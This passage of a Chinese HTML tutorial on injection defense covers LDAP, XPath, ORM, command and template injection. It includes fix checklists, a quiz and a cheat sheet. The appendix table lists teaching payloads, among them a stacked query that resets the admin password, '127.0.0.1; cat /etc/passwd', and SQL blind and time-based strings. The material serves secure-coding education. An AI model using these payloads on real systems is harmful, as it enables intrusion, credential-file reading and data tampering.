+<span class="c"># 逻辑被改写为永真条件，认证绕过 / 遍历整个目录</span>
+
+<span class="c"># 防护一：按 RFC 4515 转义 LDAP 过滤器特殊字符</span>
+<span class="c"># \ → \5c    ( → \28    ) → \29    * → \2a    NUL → \00    / → \2f</span>
+<span class="c"># 防护二（首选）：用框架的过滤 API 而非拼字符串</span>
+<span class="g">// Spring LDAP：Filter 构建器，参数走转义通道</span>
+<span class="g">Filters.equal</span>("uid", userInput).and(Filters.equal("password", pw))
+<span class="c">// Java JNDI 同理：new BasicAttributes + 属性 API，不要拼 searchFilter 字符串</span></pre>
+  <h4>XPath 注入：XML 查询的同款问题</h4>
+  <pre><span class="c">&lt;!-- 危险：用 XPath 查 XML 里的用户节点 --&gt;</span>
+<span class="r">String expr = "/users/user[username='" + name + "']";</span>
+<span class="c">// 攻击输入：x' or '1'='1</span>
+<span class="r">/users/user[username='x' or '1'='1']</span>   <span class="c">// 永真，返回所有用户节点</span>
+
+<span class="c">// 防护：用 XPath 变量绑定而不是拼字符串</span>
+<span class="g">XPath xpath = factory.newXPath();</span>
+<span class="g">xpath.setXPathVariableResolver</span>(...);        <span class="c">// $name 变量由 API 绑定</span>
+<span class="g">"/users/user[username=$name]"</span>
+<span class="c">// 变量值不会被解析为 XPath 语法，注入面为零 —— 与 SQL 参数化同一思想</span></pre>
+  <div class="callout danger">
+    <b>共同教训：</b>凡是"字符串拼查询语言"的模式 —— SQL、LDAP 过滤器、XPath、JMESPath、GraphQL 查询拼接 —— 都遵循同一条铁律：<b>查询结构必须是代码写死的，用户数据只能走"值"的通道（参数绑定 / 变量绑定 / 转义）。</b>新接触一种查询语言时，先问一句：它有变量绑定机制吗？有，就用它。
+  </div>
+</section>
+<section id="s7">
+  <div class="shead"><span class="mins">模块 7</span><h2>ORM 的注入面与防御纵深</h2></div>
+  <p class="lead">用了 ORM 不代表天然免疫。<b>ORM 自动防注入只覆盖它自己生成的查询</b>；一旦调用"原生 SQL"接口，保护就交还给你了。</p>
+  <table>
+    <tr><th style="width:200px">框架 / 接口</th><th style="width:220px">安全用法</th><th>危险用法</th></tr>
+    <tr><td class="f">JPA / Hibernate<br>createNativeQuery</td><td>createNativeQuery("... WHERE name = ?1").setParameter(1, name)</td><td>字符串拼进 SQL 再 createNativeQuery</td></tr>
+    <tr><td class="f">Spring Data<br>@Query</td><td>@Query("... WHERE name = :name") + @Param 绑定</td><td>@Query 里 f-string / SpEL 拼值；JPQL 拼字符串</td></tr>
+    <tr><td class="f">Django ORM</td><td>User.objects.filter(name=name)（自动参数化）</td><td>.raw("... '%s'" % name)、.extra(where=["..."])</td></tr>
+    <tr><td class="f">SQLAlchemy</td><td>text("... :name").bindparams(name=name) 或 ORM 查询</td><td>text(f"... '{name}'") 或 session.execute 拼字符串</td></tr>
+    <tr><td class="f">Prisma</td><td>$queryRaw 带模板参数：Prisma.sql`... ${name}`</td><td>$queryRawUnsafe 拼接字符串（名字里的 Unsafe 是认真的）</td></tr>
+    <tr><td class="f">MyBatis</td><td>#{} 占位（模块 3）</td><td>${} 接收可控值</td></tr>
+    <tr><td class="f">Mongoose (MongoDB)</td><td>查询操作符按类型使用（值不会变成查询语法）</td><td>$where 传字符串、Aggregate $function、把对象整体当查询条件不过滤键</td></tr>
+  </table>
+  <h4>防御纵深：四层防线，各管一段</h4>
+  <div class="steps">
+    <div class="step"><div class="txt"><b>第一层 · 参数化查询（修复层）：</b>所有 SQL / 命令 / 模板的汇聚点用参数绑定。这一层是"修复"，其他层都只是"缓解"。</div></div>
+    <div class="step"><div class="txt"><b>第二层 · 输入校验与白名单（收缩层）：</b>类型校验（ID 必须是整数）、长度限制、枚举白名单。把攻击面从"任意字符串"收缩到"有限形态"。</div></div>
+    <div class="step"><div class="txt"><b>第三层 · 数据库最小权限（止损层）：</b>应用账号只授 DML 权限，禁 DROP / FILE / SUPER；连接串关掉 <span class="k">allowMultiQueries=true</span> 让堆叠查询失效；按业务分库分账号。</div></div>
+    <div class="step"><div class="txt"><b>第四层 · WAF 与监控（缓解层）：</b>WAF 拦常见 payload，DB 审计日志记录异常查询。<b>注意：这两层是"缓解"，永远不是"修复"。</b></div></div>
+  </div>
+  <div class="callout danger">
+    <b>为什么 WAF 只是缓解不是修复：</b>WAF 靠规则匹配特征，而攻击者可以用编码变形（URL / Unicode / 十六进制）、大小写混淆、注释截断、分块传输、参数污染等方式绕过。<b>被 WAF 拦住的 payload 有无数种写法，被参数化挡住的注入只有一种归宿：变成普通字符串。</b>任何把 WAF 当"已修复"上线关单的行为，都是在给事故记账。
+  </div>
+</section>
+
+<section id="s8">
+  <div class="shead"><span class="mins">模块 8</span><h2>修复模式汇总：可直接抄的 checklist</h2></div>
+  <h4>三语言"危险 vs 安全"终版对照</h4>
+  <pre><span class="c">// ===== Java（JDBC / MyBatis / ProcessBuilder）=====</span>
+<span class="c">// ✗ 危险</span>
+<span class="r">"SELECT * FROM t WHERE id = " + id</span>
+<span class="r">"SELECT * FROM ${table} ORDER BY ${col}"</span>            <span class="c">// MyBatis ${} 收可控值</span>
+<span class="r">Runtime.getRuntime().exec("tar -czf " + fileName)</span>
+
+<span class="c">// ✓ 安全</span>
+<span class="g">ps = conn.prepareStatement("SELECT * FROM t WHERE id = ?"); ps.setInt(1, id);</span>
+<span class="g">ORDER BY 用 Map&lt;String,String&gt; 白名单映射 + choose 枚举</span>
+<span class="g">new ProcessBuilder("tar","-czf", out, fileName).start()</span>  <span class="c">// 数组形式</span>
+
+<span class="c">// ===== Python（sqlite3 / pymysql / subprocess / Jinja2）=====</span>
+<span class="c">// ✗ 危险</span>
+<span class="r">cur.execute(f"SELECT * FROM t WHERE id = {id}")</span>
+<span class="r">subprocess.run(f"tar -czf {out} {name}", shell=True)</span>
+<span class="r">render_template_string("Hi " + name)</span>
+
+<span class="c">// ✓ 安全</span>
+<span class="g">cur.execute("SELECT * FROM t WHERE id = ?", (id,))</span>
+<span class="g">subprocess.run(["tar","-czf",out,name], check=True)</span>
+<span class="g">render_template("page.html", name=name)</span>
+
+<span class="c">// ===== Node（mysql2 / execFile / EJS）=====</span>
+<span class="c">// ✗ 危险</span>
+<span class="r">pool.query(`SELECT * FROM t WHERE id = ${id}`)</span>
+<span class="r">exec(`tar -czf ${out} ${name}`)</span>
+<span class="r">ejs.render(userTemplate, data)</span>                <span class="c">// 用户可控模板源码</span>
+
+<span class="c">// ✓ 安全</span>
+<span class="g">pool.execute("SELECT * FROM t WHERE id = ?", [id])</span>
+<span class="g">execFile("tar", ["-czf", out, name], cb)</span>
+<span class="g">ejs.render(readFileSync("t.ejs"), data)</span>       <span class="c">// 模板体来自代码库</span></pre>
+  <h4>上线前六项自查</h4>
+  <div class="steps">
+    <div class="step"><div class="txt"><b>搜拼接：</b>全库搜索 SQL 字符串拼接（<span class="k">+ id</span>、f-string、模板字符串、StringBuilder），每处确认已改参数化或已过白名单。</div></div>
+    <div class="step"><div class="txt"><b>搜 ${：</b>MyBatis XML 与注解里的 <span class="k">${</span>，逐个确认值不可由用户控制；Hibernate/JPA 的字符串拼接 SQL 同理。</div></div>
+    <div class="step"><div class="txt"><b>搜 shell 入口：</b><span class="k">shell=True</span>、<span class="k">os.system</span>、<span class="k">Runtime.exec(String)</span>、<span class="k">exec(</span>，确认没有不可信参数直达。</div></div>
+    <div class="step"><div class="txt"><b>搜模板渲染：</b><span class="k">render_template_string</span>、<span class="k">ejs.render(变量)</span>、<span class="k">Template(String)</span>，确认模板源码不含用户输入。</div></div>
+    <div class="step"><div class="txt"><b>收紧数据库账号：</b>应用账号禁多语句（MySQL 连接串 <span class="k">allowMultiQueries=false</span>）、禁 FILE / DROP 等高危权限。</div></div>
+    <div class="step"><div class="txt"><b>补监控：</b>慢查询日志、DB 审计、异常错误率告警 —— 时间盲注的 5 秒延迟、报错注入的异常堆量，都该在监控里留痕。</div></div>
+  </div>
+</section>
+
+<section id="s9">
+  <div class="shead"><span class="mins">避坑</span><h2>十个真实坑</h2></div>
+  <div class="pit"><div class="num">1</div><div class="pb"><div class="pt">以为用了 ORM 就自动免疫注入</div><div class="pd">ORM 只保护它自己生成的查询。createNativeQuery / raw() / text() / $queryRawUnsafe 这些"逃生舱"一旦拼字符串，保护立刻失效，且因为藏得深，代码审查更容易漏。</div></div></div>
+  <div class="pit"><div class="num">2</div><div class="pb"><div class="pt">MyBatis 里用 ${} 接排序列 / 表名</div><div class="pd">"ORDER BY 不能参数化"成了用 ${} 的借口，但 ${} 收用户可控值就是裸拼。正确做法是 Map 白名单或 choose 枚举，永远别把请求参数原样喂给 ${}。</div></div></div>
+  <div class="pit"><div class="num">3</div><div class="pb"><div class="pt">LIKE 查询把用户输入拼进通配符</div><div class="pd">"%'+name+'%" 这类写法让引号和 % 一起进 SQL。安全形态是 CONCAT('%', ?, '%') 或把 % 拼进参数值再整体绑定，值本身不走拼接通道。</div></div></div>
+  <div class="pit"><div class="num">4</div><div class="pb"><div class="pt">IN (...) 列表直接拼 ID 字符串</div><div class="pd">WHERE id IN ("1,2,3") 拼接时，攻击者输入 "1); DROP TABLE t-- " 就能改写语义。按元素个数生成 ? 占位，或 MyBatis foreach 生成 #{} 列表。</div></div></div>
+  <div class="pit"><div class="num">5</div><div class="pb"><div class="pt">忽略二阶注入：入库转义、取出裸拼</div><div class="pd">数据入库时经过了参数化/转义，一切正常；但另一段业务把它取出来拼进新 SQL / 新命令时没有防护，此时触发。修复要覆盖"取出来再用"的每一处，不能只守写入端。</div></div></div>
+  <div class="pit"><div class="num">6</div><div class="pb"><div class="pt">Python 用 os.system 或 shell=True "图省事"</div><div class="pd">os.system 永远过 shell，没有任何安全形态；shell=True 让 ; | $() 全部生效。改用列表参数 + check=True，需要管道时用 shlex.quote 或管道 API。</div></div></div>
+  <div class="pit"><div class="num">7</div><div class="pb"><div class="pt">Java 用 Runtime.exec("sh -c " + cmd)</div><div class="pd">exec(String[]) 本来是安全的（不过 shell），但包一层 sh -c 后所有转义前功尽弃，等价于把用户输入交给 bash。需要管道时逐段转义或用 ProcessBuilder 的 redirectPipe。</div></div></div>
+  <div class="pit"><div class="num">8</div><div class="pb"><div class="pt">把用户输入 render_template_string 当模板渲染</div><div class="pd">Flask 的 render_template_string(user_input)、Node 的 ejs.render(userTemplate) 让用户输入变成模板源码，{{7*7}} 返回 49 即中招。输入永远走"模板变量"通道，模板体必须来自代码库。</div></div></div>
+  <div class="pit"><div class="num">9</div><div class="pb"><div class="pt">以为 WAF 拦住了就是修复完了</div><div class="pd">WAF 是特征匹配，编码变形、注释截断、分块传输都能绕。WAF 属于"缓解层"，参数化才是"修复层"；把 WAF 当修复上线，等于把防线建在沙滩上。</div></div></div>
+  <div class="pit"><div class="num">10</div><div class="pb"><div class="pt">数据库账号给太大，堆叠查询门户大开</div><div class="pd">应用账号拿着 DROP / FILE / SUPER 权限，连接串还开着 allowMultiQueries=true，一个注入点就能升级成拖库、写文件、拿权限。最小权限 + 关多语句，是把事故控制在"泄露"而不是"沦陷"的关键一步。</div></div></div>
+</section>
+
+<section id="s10">
+  <div class="shead"><span class="mins">自测</span><h2>六道题</h2></div>
+  <div class="quiz">
+    <div class="q" data-a="1">
+      <div class="qt">1. 关于参数化查询（PreparedStatement）为什么能防 SQL 注入，哪个解释是对的？</div>
+      <button class="opt">因为它会自动检测输入里的 SQL 关键字并过滤</button>
+      <button class="opt">因为 SQL 结构先编译成执行计划，参数以"值"的形式绑定，不参与语法解析</button>
+      <button class="opt">因为它会把输入做 HTML 转义，引号就失效了</button>
+      <div class="ans">正确答案：<b>结构先编译、参数只做值绑定</b>。数据库在解析 SQL 模板时 ? 只是占位符，之后传入的参数走独立的数据通道，永远进不了语法层 —— 所以引号、分号、注释符都只是普通字符串。它不是"过滤"，也不是"转义"。</div>
+    </div>
+    <div class="q" data-a="2">
+      <div class="qt">2. MyBatis 中 #{} 和 ${} 的区别，正确的是？</div>
+      <button class="opt">两者等价，只是书写风格不同</button>
+      <button class="opt">#{} 是预编译占位符（安全），${} 是字符串拼接（危险，可控值必须过白名单）</button>
+      <button class="opt">#{} 用于字符串，${} 用于数字，数字场景用 ${} 更安全</button>
+      <div class="ans">正确答案：<b>#{} 生成 ? 走预编译绑定，${} 在构建 SQL 阶段直接拼接</b>。${} 唯一合理的用途是动态表名 / 列名，且必须白名单映射。与数字还是字符串无关 —— 数字位置用 ${} 一样危险。</div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">3. 用户提交一个 IP，服务端要执行 ping。下面哪种写法是安全的？</div>
+      <button class="opt">subprocess.run(["ping", "-c", "1", ip])</button>
+      <button class="opt">subprocess.run(f"ping -c 1 {ip}", shell=True)</button>
+      <button class="opt">os.system("ping -c 1 " + ip)</button>
+      <div class="ans">正确答案：<b>列表形式、不过 shell</b>。参数以数组元素独立传递，; | $() 这些元字符不会被解析。shell=True 和 os.system 都会把整串交给 shell 解析，元字符全部生效。注意数组形式也不防"被调程序本身把参数当代码"（如 find -exec），配合最小权限使用。</div>
+    </div>
+    <div class="q" data-a="1">
+      <div class="qt">4. 页面回显被关闭、真假响应也一致，攻击者还可以用什么手段从布尔盲注升级？</div>
+      <button class="opt">改用堆叠查询直接拖库</button>
+      <button class="opt">时间盲注：用 SLEEP / pg_sleep 等延迟函数把真假转成响应时间差</button>
+      <button class="opt">改用报错注入读取错误信息</button>
+      <div class="ans">正确答案：<b>时间盲注</b>。当页面表现不可区分时，让数据库条件为真时睡 5 秒，用响应时间做信号，逐比特猜解数据。堆叠查询需要驱动支持多语句，报错注入需要错误回显 —— 两者都依赖额外条件，时间盲注是最后的通用手段。所以 DB 响应时间的异常抖动本身就该告警。</div>
+    </div>
+    <div class="q" data-a="2">
+      <div class="qt">5. 关于 SSTI（模板注入），判断中招的最简方法是？</div>
+      <button class="opt">输入单引号看是否报错</button>
+      <button class="opt">输入 &lt;script&gt;alert(1)&lt;/script&gt; 看是否弹窗</button>
+      <button class="opt">输入 {{7*7}}（或 ${7*7}）看页面是否出现 49</button>
+      <div class="ans">正确答案：<b>{{7*7}} 看是否被求值</b>。如果输入被原样显示，说明它是数据；如果出现 49，说明它被当成模板源码渲染 —— SSTI 成立，且模板语法是图灵完备的，离代码执行只差对象链。这也解释了防御：用户输入只能走"模板变量"通道（render_template + 变量），绝不能进 render_template_string。</div>
+    </div>
+    <div class="q" data-a="0">
+      <div class="qt">6. 关于防御纵深，下面哪个说法是对的？</div>
+      <button class="opt">WAF 是缓解层不是修复层，参数化查询才是修复层</button>
+      <button class="opt">上了 WAF 之后，代码里的 SQL 拼接就可以放行</button>
+      <button class="opt">输入校验（类型/长度/白名单）做够了，就不需要参数化了</button>
+      <div class="ans">正确答案：<b>WAF 属于缓解，参数化属于修复</b>。WAF 靠特征匹配，编码变形、注释截断、分块传输都能绕过；输入校验同样可能漏（黑名单永远不完整）。只有参数绑定让数据物理上无法进入语法层，是根因层面的修复。各层是叠加关系，不是替代关系。</div>
+    </div>
+  </div>
+</section>
+
+<section id="s11">
+  <div class="shead"><span class="mins">附录</span><h2>速查卡与术语表</h2></div>
+  <h3>按场景查修复模式</h3>
+  <div class="cmds">
+    <div class="crow"><code>WHERE name = ? / %s / :name</code><span class="desc">等值条件参数化，三端通用</span><button class="copy">复制</button></div>
+    <div class="crow"><code>LIKE CONCAT('%', ?, '%')</code><span class="desc">模糊查询安全形态，% 在 SQL 侧</span><button class="copy">复制</button></div>
+    <div class="crow"><code>WHERE id IN (?,?,?)</code><span class="desc">IN 列表按元素个数生成占位</span><button class="copy">复制</button></div>
+    <div class="crow"><code>Map&lt;String,String&gt; 列名白名单</code><span class="desc">动态排序列 / 表名的唯一正解</span><button class="copy">复制</button></div>
+    <div class="crow"><code>#{name}</code><span class="desc">MyBatis 安全占位符</span><button class="copy">复制</button></div>
+    <div class="crow"><code>subprocess.run([...])</code><span class="desc">Python 命令执行安全形态</span><button class="copy">复制</button></div>
+    <div class="crow"><code>new ProcessBuilder(...)</code><span class="desc">Java 命令执行安全形态</span><button class="copy">复制</button></div>
+    <div class="crow"><code>execFile(cmd, [args])</code><span class="desc">Node 命令执行安全形态</span><button class="copy">复制</button></div>
+    <div class="crow"><code>render_template(f.html, x=input)</code><span class="desc">模板渲染安全形态</span><button class="copy">复制</button></div>
+    <div class="crow"><code>Filters.equal("uid", input)</code><span class="desc">Spring LDAP 过滤 API，替代拼字符串</span><button class="copy">复制</button></div>
+    <div class="crow"><code>allowMultiQueries=false</code><span class="desc">MySQL 连接串关堆叠查询</span><button class="copy">复制</button></div>
+    <div class="crow"><code>grep -rn 'shell=True' --include='*.py'</code><span class="desc">排查命令执行入口</span><button class="copy">复制</button></div>
+    <div class="crow"><code>grep -rn '\${' --include='*.xml' src/</code><span class="desc">排查 MyBatis 拼接点</span><button class="copy">复制</button></div>
+  </div>
+
+  <h3>教学 payload 与防线速查</h3>
+  <table>
+    <tr><th style="width:120px">类型</th><th style="width:250px">教学 payload（特征）</th><th>防线</th></tr>
+    <tr><td><b>SQL 报错</b></td><td class="f">' AND updatexml(1,concat(0x7e,version()),1)-- </td><td>参数化 + 关闭生产错误回显</td></tr>
+    <tr><td><b>SQL 盲注</b></td><td class="f">' AND SUBSTRING(db_name(),1,1)='a'-- </td><td>参数化 + 统一错误页</td></tr>
+    <tr><td><b>时间盲注</b></td><td class="f">' AND IF(1=1,SLEEP(5),0)-- </td><td>参数化 + 慢查询 / 响应时间监控</td></tr>
+    <tr><td><b>堆叠查询</b></td><td class="f">x'; UPDATE users SET pw='x' WHERE name='admin'-- </td><td>参数化 + allowMultiQueries=false + 最小权限</td></tr>
+    <tr><td><b>命令注入</b></td><td class="f">127.0.0.1; cat /etc/passwd</td><td>数组参数 + 不用 shell + 最小权限</td></tr>
+    <tr><td><b>SSTI</b></td><td class="f">{{7*7}} / ${7*7}</td><td>输入走模板变量，模板体来自代码库</td></tr>
+    <tr><td><b>LDAP</b></td><td class="f">*)(uid=*))(|(uid=*</td><td>RFC 4515 转义 + Filter API</td></tr>
+    <tr><td><b>XPath</b></td><td class="f">x' or '1'='1</td><td>XPath 变量绑定，不拼字符串</td></tr>
+  </table>
+
+  <h3>术语表</h3>
+  <table>
+    <tr><th style="width:190px">术语</th><th>一句话解释</th></tr>
+    <tr><td><b>注入</b></td><td>不可信数据被当作代码 / 查询语法执行，导致语义被改写</td></tr>
+    <tr><td><b>汇聚点 sink</b></td><td>数据被当成代码执行的位置：SQL 语句、shell 命令、模板源码等</td></tr>
+    <tr><td><b>参数化查询</b></td><td>SQL 结构先编译，参数以"值"绑定，从物理上隔绝注入</td></tr>
+    <tr><td><b>预编译</b></td><td>数据库先把带占位符的 SQL 解析成执行计划，供后续复用</td></tr>
+    <tr><td><b>#{} / ${}</b></td><td>MyBatis 的预编译占位符（安全）/ 字符串拼接符（危险）</td></tr>
+    <tr><td><b>堆叠查询</b></td><td>用 ; 在一条请求里执行多条 SQL，需要驱动允许多语句</td></tr>
+    <tr><td><b>二阶注入</b></td><td>恶意数据先合法入库，被取出拼进新查询时才触发的注入</td></tr>
+    <tr><td><b>布尔盲注</b></td><td>利用页面真假表现差异，逐字符猜解数据</td></tr>
+    <tr><td><b>时间盲注</b></td><td>用 SLEEP 等延迟函数把真假条件转成响应时间差</td></tr>
+    <tr><td><b>报错注入</b></td><td>构造让数据库报错的语句，把查询结果带进错误信息</td></tr>
+    <tr><td><b>命令注入</b></td><td>不可信数据进入 shell 命令字符串，元字符追加执行任意命令</td></tr>
+    <tr><td><b>shell 元字符</b></td><td>; | &amp; ` $() 换行等具有 shell 语法意义的字符</td></tr>
+    <tr><td><b>SSTI</b></td><td>服务端模板注入：用户输入被当成模板源码渲染，可升级为 RCE</td></tr>
+    <tr><td><b>LDAP 注入</b></td><td>闭合 LDAP 过滤器的括号结构，改写查询逻辑</td></tr>
+    <tr><td><b>XPath 注入</b></td><td>向 XPath 表达式注入 or '1'='1 类永真条件</td></tr>
+    <tr><td><b>白名单</b></td><td>只接受枚举内的值（如排序列映射），其余一律拒绝</td></tr>
+    <tr><td><b>WAF</b></td><td>Web 应用防火墙，靠特征匹配拦截攻击，属缓解层非修复层</td></tr>
+    <tr><td><b>纵深防御</b></td><td>多层防线叠加，任一层被绕过仍有下一层兜底</td></tr>
+    <tr><td><b>最小权限</b></td><td>数据库账号 / 运行用户只授予必需权限，压缩事故半径</td></tr>
+    <tr><td><b>RFC 4515</b></td><td>定义 LDAP 过滤器字符串转义规则的标准</td></tr>
+  </table>
+
+  <div class="callout ok">
+    <b>下一步怎么练：</b>① 用模块 0 的 SQLite 脚本亲手复现一次注入与一次参数化防护；② 在自己项目里跑一遍自查 grep（${、shell=True、exec、render_template_string）；③ 给 MyBatis 的 ORDER BY 场景写一个列名白名单 Map；④ 检查生产数据库应用账号的权限清单和连接串的 allowMultiQueries。<br><br>
+    <b>之后值得单独学：</b>NoSQL 注入（MongoDB $where / 操作符注入）、ORM 二次注入审计方法、以及把 SQL 注入检测接进 CI 的静态扫描规则（Semgrep）。
+  </div>
+</section>
+</main>
+
+<footer>二十分钟学透注入攻防 · 上线前自查：还有没有一处字符串拼接的 SQL</footer>
+
+<script>
+var total=1200,left=total,timer=null,running=false;
+var clock=document.getElementById('clock'),startBtn=document.getElementById('start'),hint=document.getElementById('hint');
+function fmt(s){var m=Math.floor(s/60),x=s%60;return (m<10?'0':'')+m+':'+(x<10?'0':'')+x;}
+function tick(){
+  left--;clock.textContent=fmt(Math.max(left,0));
+  if(left<=180&&left>0){clock.classList.add('done');}
+  if(left<=0){
+    clearInterval(timer);running=false;clock.textContent='00:00';clock.classList.add('done');
+    startBtn.textContent='再来一轮';
+    hint.textContent='时间到。模块 2（参数化本质）和模块 3（MyBatis ${}）是重点，值得再读一遍。';
+  }
+}
+startBtn.onclick=function(){
+  if(running){clearInterval(timer);running=false;startBtn.textContent='继续';return;}
+  if(left<=0){left=total;clock.classList.remove('done');clock.textContent=fmt(left);}
+  running=true;startBtn.textContent='暂停';
+  hint.textContent='计时中 —— 边看边对照自己项目里的 SQL 和命令执行代码。';
+  timer=setInterval(tick,1000);
+};
+document.getElementById('reset').onclick=function(){
+  clearInterval(timer);running=false;left=total;
+  clock.textContent=fmt(total);clock.classList.remove('done');
+  startBtn.textContent='开始计时';
+  hint.textContent='建议边读边对着自己项目里的 SQL 拼接和命令执行代码逐条检查';
+};
+window.addEventListener('scroll',function(){
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  document.getElementById('bar').style.width=(h>0?(window.scrollY/h*100):0)+'%';
+});
+document.querySelectorAll('.copy').forEach(function(b){
+  b.onclick=function(){
+    var t=b.parentNode.querySelector('code').textContent;
+    var done=function(){b.textContent='已复制';b.classList.add('ok');setTimeout(function(){b.textContent='复制';b.classList.remove('ok');},1200);};
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done,function(){fb(t);done();});}
+    else{fb(t);done();}
+  };
+});
+function fb(t){
+  var ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(ta);
+}
+document.querySelectorAll('.q').forEach(function(q){
+  var idx=parseInt(q.dataset.a,10),opts=q.querySelectorAll('.opt');
+  opts.forEach(function(o,i){
+    o.onclick=function(){
+      if(q.dataset.done)return;
+      q.dataset.done='1';
+      opts.forEach(function(x,j){x.classList.add(j===idx?'right':'wrong');});
+      q.querySelector('.ans').classList.add('show');
+    };
+  });
+});
+</script>
+</body>
+</html>
